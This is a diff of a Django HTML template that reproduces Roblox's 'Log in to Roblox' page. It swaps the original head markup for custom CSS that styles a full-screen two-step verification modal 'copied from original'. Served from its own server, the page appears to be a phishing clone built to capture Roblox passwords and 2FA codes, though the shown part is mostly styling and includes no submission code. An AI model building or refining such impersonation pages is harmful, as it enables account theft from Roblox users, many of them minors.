@@ -1,1843 +1,1021 @@
 {% load static %}
 <html lang="en">
 
-    <head>
-        <!-- MachineID: 216291d1-9607-7282-cb09-ddb4489d1e4c -->
-        <title>Log in to Roblox</title>
-
-        <meta http-equiv="X-UA-Compatible"
-            content="IE=edge,requiresActiveX=true">
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="author" content="Roblox Corporation">
-        <meta name="description"
-            content="Login to your Roblox account or sign up to create a new account.">
-        <meta name="keywords"
-            content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">
-
-        <meta name="apple-itunes-app" content="app-id=431946152">
-
-        <link rel="apple-touch-icon"
-            href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png">
-
-        <meta ng-csp="no-unsafe-eval">
-
-        <meta name="locale-data" data-language-code="en_us"
-            data-language-name="English" data-url-locale
-            data-override-language-header="false">
-        <meta name="device-meta" data-device-type="computer"
-            data-is-in-app="false" data-is-desktop="true" data-is-phone="false"
-            data-is-tablet="false" data-is-console="false"
-            data-is-android-app="false" data-is-ios-app="false"
-            data-is-uwp-app="false" data-is-xbox-app="false"
-            data-is-amazon-app="false" data-is-win32-app="false"
-            data-is-studio="false" data-is-game-client-browser="false"
-            data-is-ios-device="false" data-is-android-device="false"
-            data-is-universal-app="false" data-app-type="unknown"
-            data-is-chrome-os="false" data-is-pcgdk-app="false">
-        <meta name="environment-meta" data-domain="roblox.com"
-            data-is-testing-site="false">
-
-        <meta id="roblox-display-names" data-enabled="true">
-
-        <meta name="hardware-backed-authentication-data"
-            data-is-secure-authentication-intent-enabled="true"
-            data-is-bound-auth-token-enabled="true"
-            data-bound-auth-token-whitelist="{&quot;Whitelist&quot;:[{&quot;apiSite&quot;:&quot;auth.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;inventory.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;accountinformation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;billing.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;premiumfeatures.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;trades.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;groups.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;adconfiguration.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;ads.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;assetdelivery.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;avatar.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;badges.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;catalog.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;chat.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;chatmoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;clientsettings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;contacts.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;contentstore.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;develop.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;economy.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;engagementpayouts.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;followings.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;friends.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;gameinternationalization.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;gamejoin.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;gamepersistence.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;games.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;groupsmoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},{&quot;apiSite&quot;:&quot;itemconfiguration.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;locale.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;localizationtables.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;metrics.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;moderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;notifications.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;points.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;presence.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;publish.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;privatemessages.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;thumbnailsresizer.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;thumbnails.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;translationroles.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;translations.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;twostepverification.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;},  {&quot;apiSite&quot;:&quot;usermoderation.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;users.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;voice.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;realtimenotifications.roblox.com&quot;,&quot;sampleRate&quot;:&quot;100&quot;}, {&quot;apiSite&quot;:&quot;jQuery&quot;,&quot;sampleRate&quot;:&quot;1000000&quot;}]}"
-            data-bound-auth-token-exemptlist="{&quot;Exemptlist&quot;:[]}"
-            data-hba-indexed-db-name="hbaDB"
-            data-hba-indexed-db-obj-store-name="hbaObjectStore"
-            data-hba-indexed-db-key-name="hba_keys"
-            data-hba-indexed-db-version="1" data-bat-event-sample-rate="500">
-        <meta name="account-switching-data"
-            data-is-account-switching-enabled="true">
-
-        <meta name="passkey-data" data-is-passkey-login-enabled="true">
-        <meta name="passkey-data-android"
-            data-is-passkey-login-enabled-android="true">
-
-        <meta name="page-guac-migration" data-v1-path data-v2-path>
-
-        <meta name="page-meta" data-internal-page-name="Login">
-        <meta name="page-retry-header-enabled"
-            data-retry-attempt-header-enabled="True">
-
-        <link
-            href="https://images.rbxcdn.com/38a98b7c99d2d5f7c29e5a19478872c7.ico"
-            rel="icon">
-
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="FoundationCss" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/e8da15d6323c15ba58ca8ad7aec788fd820b46f80ae28d48f95b199ef10d95e7.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="StyleGuide" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/944c0c29b874f40bc983ce7754218170b4265e625e7351b1c6880694adb81556.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="Builder" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/7fc67d38cfc34042bc251805f872ff5be8cb502859e943e5dda46fc3907375c6.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="Thumbnails" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/d6db63fa1054c8114471750134a3a4c0a9870a5e86b4d0a3be708582085b0f03.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="CaptchaCore" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/66b2fd496e668938e3b0e2d9a0c12f9f88c3a1a4974608f69059d8061fc0141f.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="Challenge" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/0cc9507b7c1ea65fd2cb7399782339c8eee577465af7a1bc41d15720f3472c55.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="VerificationUpsell" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/f77e16b9fa5823882aaa0cdabade9706b9ba2b7e050d23d2831da138a58e5f7f.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="RobloxBadges" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="AccountSwitcher" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/49fff8dad77e5262087267ee2e8fda1607525506c4a1ca20af60f9757684e980.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="PriceTag" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/9bfc48ea40a698035ea8cbe3d3e94bd06d3aac48969bedceb6d8ba5ff17ff84d.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="SearchLandingPage" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/df9a376522ff4c39e6d789e6bcc3d4b2817bdac228020ee6fb4990807031f319.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="Navigation" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/f7426ffb19aeabf7440648f7fc7658fa8f823763664f8b667d9b45c8007e3d20.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="CookieBannerV3" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/03e27b1120e6fb785c663a524f2dcea1b65861504af3f6f1e903c5530125f834.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="Footer" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/34dd1fec808320ee37a2554b194c6df704dd5c201d8c5842ecea3b9093341873.css">
-
-        <link rel="canonical"
-            href="https://www.roblox.com/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile">
-
-        <link rel="alternate"
-            href="https://www.roblox.com/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="x-default">
-        <link rel="alternate"
-            href="https://www.roblox.com/de/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="de">
-        <link rel="alternate"
-            href="https://www.roblox.com/es/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="es">
-        <link rel="alternate"
-            href="https://www.roblox.com/fr/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="fr">
-        <link rel="alternate"
-            href="https://www.roblox.com/id/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="id">
-        <link rel="alternate"
-            href="https://www.roblox.com/it/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="it">
-        <link rel="alternate"
-            href="https://www.roblox.com/ja/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="ja">
-        <link rel="alternate"
-            href="https://www.roblox.com/ko/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="ko">
-        <link rel="alternate"
-            href="https://www.roblox.com/pl/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="pl">
-        <link rel="alternate"
-            href="https://www.roblox.com/pt/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="pt">
-        <link rel="alternate"
-            href="https://www.roblox.com/th/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="th">
-        <link rel="alternate"
-            href="https://www.roblox.com/tr/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="tr">
-        <link rel="alternate"
-            href="https://www.roblox.com/vi/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="vi">
-        <link rel="alternate"
-            href="https://www.roblox.com/ar/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F1976656748%2Fprofile"
-            hreflang="ar">
-
-        <link
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            rel="stylesheet"
-            href="https://static.rbxcdn.com/css/leanbase___fb0c7d1e28371fc5e8367ce241b98d69_m.css/fetch">
-
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="AccessManagementUpsellV2" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/cf2178d3571b2a1cfb74560d9488b0c85e18e91ec4cf042961531d4ab96337d5.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="Captcha" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/bc981bafa6b0a52c86d071d1f81b24168a8dd92e72b8ac52d37cb46bf8bd8c42.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="CrossDeviceLoginDisplayCode"
-            data-bundle-source="Main"
-            href="https://css.rbxcdn.com/07d73a0fe62fadd30d32d50e667e7d6b62ca192cd258a1c3340cb262de401d72.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="AccountSelector" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/97a9d5a74599e95902f6456aea6e3cfaa9fe463ebbe0ae4a6a5025d40e1b7866.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="AccountRecoveryModal" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="ReactLogin" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/32b67c58d5a22d084201bb7d304744a0fc18effe362ea146f694068f3fc2628c.css">
-
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="RobuxIcon" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/7dfc7837b5da6850e13413c630b37da7e88aeb610ca2c7d4e8b71b02cbdc6ba6.css">
-
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="ItemPurchase" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/e3e6436f624fa558780c3b1f6645c0b6033d84b07cefc7922dd33efbe00c2b51.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="IdVerification" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/3bca47a98d58fdf98a7063c4f3b390671e5326ed559813887f3945876c997da6.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="AccessManagementUpsell" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/d45e200658a1343116bbf4a88c367d093758085e7d001918d641c85b2143468f.css">
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="GameLaunch" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/c5373f0dced8d7be7bb3ad1b978fb8af776157fcc41ad3d5c92d725063c2e6e1.css">
-
-        <link rel="stylesheet"
-            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
-            data-bundlename="UserAgreementsChecker" data-bundle-source="Main"
-            href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">
-
-        <meta name="roblox-tracer-meta-data" data-access-token
-            data-service-name="Web" data-tracer-enabled="false"
-            data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com"
-            data-sample-rate="0"
-            data-is-instrument-page-performance-enabled="false">
-
-        <meta name="viewport"
-            content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-
-        <meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False"
-            data-webapp-cache-expirations-timespan="00:01:00"
-            data-request-min-cooldown="1000" data-request-max-cooldown="30000"
-            data-request-max-retry-attempts="4" data-request-batch-size="100"
-            data-thumbnail-metrics-sample-size="20"
-            data-concurrent-thumbnail-request-count="4">
-
-        <style type="text/css">
-        .foundation-web-interactable {
-            overflow: hidden;
-            position: relative
+<head>
+    <!-- MachineID: 216291d1-9607-7282-cb09-ddb4489d1e4c -->
+    <title>Log in to Roblox</title>
+    <style>
+        body {
+            width: 100%;
+            min-width: 320px;
+            height: 100%;
+            margin-bottom: 168px;
+            font-family: HCo Gotham SSm, Helvetica Neue, Helvetica, Arial, Lucida Grande, sans-serif;
         }
 
-        .foundation-web-interactable:before {
-            bottom: 0;
-            content: "";
+        /* 2-Step Verification Modal Roblox Style - Copied from Original */
+        #twostepverification {
+            position: fixed;
+            top: 0;
             left: 0;
-            position: absolute;
-            right: 0;
-            top: 0
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            display: none;
         }
 
-        .foundation-web-interactable:focus-visible {
-            outline: var(--stroke-thicker) solid var(--color-selection-start)
+        .dark-theme .modal-dialog .modal-content {
+            background-color: #272930;
+            color: #f7f7f8;
         }
 
-        @media (hover:hover) {
-            .foundation-web-interactable:not(:disabled):hover:before {
-                background: var(--color-state-hover)
-            }
+        #twostepverification .modal-lock-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            background-image: url('https://images.rbxcdn.com/2fa6b5d17e58cd53f950c6e5c807b55e-lock.svg');
+            background-position: center;
+            background-repeat: no-repeat;
+            background-size: contain;
         }
 
-        .foundation-web-interactable:not(:disabled):active:before {
-            background-color: var(--color-state-press)
-        }
-    </style>
-        <style type="text/css">
-        @keyframes rotation {
-            0% {
-                transform: rotate(0deg)
-            }
 
-            to {
-                transform: rotate(359deg)
-            }
-        }
-
-        .foundation-web-loading-spinner {
-            animation: rotation 1s linear infinite normal
-        }
-
-        .foundation-web-loading-spinner svg path {
-            fill: var(--color-action-standard-foreground)
-        }
-    </style>
-        <style type="text/css">
-        .foundation-web-button {
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            user-select: none
-        }
-
-        .foundation-web-button[disabled] {
-            opacity: .5
-        }
-
-        .foundation-web-button.content-action-emphasis {
-            --button-spinner-fill: var(--color-action-emphasis-foreground)
-        }
-
-        .foundation-web-button.content-action-standard {
-            --button-spinner-fill: var(--color-action-standard-foreground)
-        }
-
-        .foundation-web-button.content-action-soft-emphasis {
-            --button-spinner-fill: var(--color-action-soft-emphasis-foreground)
-        }
-
-        .foundation-web-button.content-action-alert {
-            --button-spinner-fill: var(--color-action-alert-foreground)
-        }
-
-        .foundation-web-button .foundation-web-loading-spinner svg path {
-            fill: var(--button-spinner-fill)
-        }
-
-        .foundation-web-button .foundation-web-button-content.isLoading {
-            opacity: 0
-        }
-
-        .foundation-web-button .foundation-web-loading-spinner-wrapper {
+        #twostepverification .modal-modern {
+            position: fixed;
+            top: 45%;
             left: 50%;
-            position: absolute;
-            top: 50%;
-            transform: translate(-50%, -50%)
-        }
-    </style>
-        <style type="text/css">
-        .disabled {
-            opacity: .5
+            transform: translate(-50%, -50%);
+            z-index: 2;
+            display: block !important;
+            width: 100vw;
+            height: 110vh;
         }
 
-        .foundation-web-radio-indicator:after {
-            background-color: var(--color-action-sub-emphasis-foreground);
-            border-radius: 100%;
-            content: "";
-            display: block
+        #twostepverification .modal-content {
+            background-color: #272930;
+            border-radius: 8px;
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.08);
+            border: none;
+            width: 100%;
+            height: 100%;
         }
 
-        .foundation-web-radio-indicator-xsmall:after {
-            height: var(--size-150);
-            width: var(--size-150)
+        .modal-dialog {
+            box-sizing: border-box;
+            text-align: left;
+            vertical-align: middle;
+            width: 517px !important;
+            height: 613px;
+            max-width: 100%;
+            margin: 0;
+            display: inline-block;
         }
 
-        .foundation-web-radio-indicator-small:after {
-            height: var(--size-200);
-            width: var(--size-200)
-        }
-
-        .foundation-web-radio-indicator-large:after,
-        .foundation-web-radio-indicator-medium:after {
-            height: var(--size-250);
-            width: var(--size-250)
-        }
-
-        .foundation-web-radio {
+        .modal-modern .modal-dialog .modal-content .modal-header {
+            display: grid;
+            grid-template-columns: minmax(0, 1fr) auto minmax(0, 1fr);
+            grid-gap: 48px;
             align-items: center;
-            border: var(--stroke-standard) solid;
-            border-color: var(--color-stroke-emphasis);
-            border-radius: 100%;
+            justify-items: center;
+            margin-bottom: 18px;
+            border-bottom-color: rgba(39, 41, 48, .2);
+            padding: 0 5px !important;
+            border-color: #494d5a;
+        }
+
+        .modal-header .modal-title {
+            font-size: 20px;
+            font-weight: 400;
+            line-height: 24px;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-header .modal-modern-header-button {
+            margin-right: auto;
+            border: none;
+            background: transparent;
+            padding: 0;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-body .modal-lock-icon {
+            margin-top: 24px;
+            margin-bottom: 24px;
+            background-image: url(https://images.rbxcdn.com/2fa6b5d17e58cd53f950c6e5c807b55e-lock.svg);
+            background-position: 50%;
+            background-repeat: no-repeat;
+            background-size: auto 156px;
+            height: 156px !important;
+            width: 100% !important;
+        }
+
+        .builder-font div {
+            font-size: 16px;
+            font-weight: 400;
+            line-height: 1.4em;
+        }
+
+        .modal-margin-bottom-xlarge {
+            margin-bottom: 24px !important;
+            font-size: 16px !important;
+            font-weight: 400 !important;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-body p {
+            margin: 24px;
+            max-width: 543px !important;
+            text-align: center !important;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-body .modal-body-button-link {
+            display: block;
+            margin-right: auto;
+            margin-left: auto;
+            outline: none;
+            border: none;
+            background: transparent;
+            padding: 0;
+            color: white;
+            font-weight: 700;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-footer .modal-modern-footer-buttons:not(:last-child) {
+            margin-bottom: 18px;
+        }
+
+        .modal-modern .modal-dialog .modal-content .modal-footer .modal-modern-footer-buttons {
             display: flex;
-            flex: 0 0 auto;
-            flex-direction: column;
-            justify-content: center;
-            outline-offset: 3px
+            width: 100%;
         }
 
-        .foundation-web-radio[data-state=checked] {
-            background-color: var(--color-action-sub-emphasis-background)
-        }
+        /* Keep your existing CSS rules for layout and other elements */
+        /* ... (your existing CSS) ... */
     </style>
-        <meta http-equiv="origin-trial"
-            content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta
-            http-equiv="origin-trial"
-            content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta
-            http-equiv="origin-trial"
-            content="A9nrunKdU5m96PSN1XsSGr3qOP0lvPFUB2AiAylCDlN5DTl17uDFkpQuHj1AFtgWLxpLaiBZuhrtb2WOu7ofHwEAAACKeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiQUlQcm9tcHRBUElNdWx0aW1vZGFsSW5wdXQiLCJleHBpcnkiOjE3NzQzMTA0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta
-            http-equiv="origin-trial"
-            content="A93bovR+QVXNx2/38qDbmeYYf1wdte9EO37K9eMq3r+541qo0byhYU899BhPB7Cv9QqD7wIbR1B6OAc9kEfYCA4AAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiQUlQcm9tcHRBUElNdWx0aW1vZGFsSW5wdXQiLCJleHBpcnkiOjE3NzQzMTA0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta
-            http-equiv="origin-trial"
-            content="A1S5fojrAunSDrFbD8OfGmFHdRFZymSM/1ss3G+NEttCLfHkXvlcF6LGLH8Mo5PakLO1sCASXU1/gQf6XGuTBgwAAACQeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiQUlQcm9tcHRBUElNdWx0aW1vZGFsSW5wdXQiLCJleHBpcnkiOjE3NzQzMTA0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"></head>
 
-    <body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font"
-        data-performance-relative-value="0.005"
-        style="background-image: url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); background-size: cover; background-repeat: no-repeat; background-attachment: fixed;"
-        data-internal-page-name="Login" data-send-event-percentage="0"
